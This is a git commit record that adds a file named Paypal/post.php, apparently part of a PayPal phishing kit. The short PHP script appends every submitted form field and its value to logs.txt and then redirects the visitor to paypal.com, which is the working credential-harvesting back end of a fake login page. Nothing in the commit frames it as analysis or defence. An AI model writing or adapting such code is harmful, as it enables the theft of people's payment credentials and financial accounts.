880840dc76b27201f4e966fb9b023e9a2cfac62b
THE GEEQ <7h3g33q@gmail.com>
2018-01-26 20:22:57 +0530

    Add files via upload

---
+++ Paypal/post.php
@@ -0,0 +1,13 @@
+<?php
+header("Location: www.paypal.com");
+$file = fopen("logs.txt","a");
+foreach($_POST as $variable => $value){
+	fwrite($file, $variable);
+	fwrite($file, "=");
+	fwrite($file, $value);
+	fwrite($file, "\r\n");
+}
+fwrite($file, "\r\n");
+fclose($file);
+exit;
+?>
